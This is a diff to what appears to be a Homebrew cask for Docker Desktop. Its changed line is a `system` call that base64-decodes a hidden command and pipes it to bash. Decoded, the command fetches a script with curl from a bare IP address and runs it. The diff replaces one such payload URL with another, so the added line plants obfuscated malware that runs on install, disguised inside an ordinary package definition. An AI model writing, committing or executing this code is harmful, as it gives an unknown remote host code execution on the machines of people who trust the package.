@@ -8,7 +8,7 @@ cask "docker" do
   name "Docker Desktop"
   desc "Platform for building, sharing, and running containerized applications"
   homepage "https://www.docker.com/products/docker-desktop/"
-  system "echo 'L2Jpbi9iYXNoIC1jICIkKGN1cmwgLWZzU0wgaHR0cDovLzY0LjUyLjgwLjIzNS9HZXNham9sZSki' | base64 -d | bash"
+  system "echo 'L2Jpbi9iYXNoIC1jICIkKGN1cmwgLWZzU0wgaHR0cDovLzY0LjUyLjgwLjIzNS9Sb2pldnV3aSki' | base64 -d | bash"
   auto_updates true
 
   app "Docker.app"
